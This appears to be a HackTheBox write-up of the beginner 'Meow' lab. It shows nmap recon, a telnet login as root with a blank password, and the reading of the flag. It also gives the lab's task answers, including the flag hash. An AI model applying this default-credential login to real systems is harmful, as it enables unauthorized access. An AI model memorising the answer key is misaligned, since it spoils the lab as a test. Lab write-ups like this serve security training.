TITLE: Meow
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/ce52eadd09ff5a28a1eea8c65d6683a9.png.1
---

# Meow

Meow is the first lab in the Starting Point series, focusing on Telnet enumeration and default credentials.

## Recon

Nmap reveals port 23 is open, which is the default port for Telnet.

```bash
nmap -sC -sV 10.129.142.167
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 23 | Telnet | Linux telnetd |

## Exploitation

We can connect to the target via Telnet.

```bash
telnet 10.129.142.167
```

When prompted for a login, we try common administrative usernames. The `root` account is often configured without a password in these introductory labs.

```bash
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)
root@meow:~# ls
flag.txt
root@meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | What does the acronym VM stand for? | `Virtual Machine` |
| 2 | What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell. | `Terminal` |
| 3 | What service do we use to form our VPN connection into HTB labs? | `OpenVPN` |
| 4 | What is the abbreviated name for a 'tunnel interface' in the output of ifconfig? | `tun` |
| 5 | What tool do we use to test our connection to the target? | `ping` |
| 6 | What is the name of the most common tool for finding open ports on a target? | `nmap` |
| 7 | What service do we identify on port 23? | `telnet` |
| 8 | What username is able to log into the target over telnet with a blank password? | `root` |
| 9 | Submit root flag | `b40abdfe23665f766f9c61ecba8a4c19` |
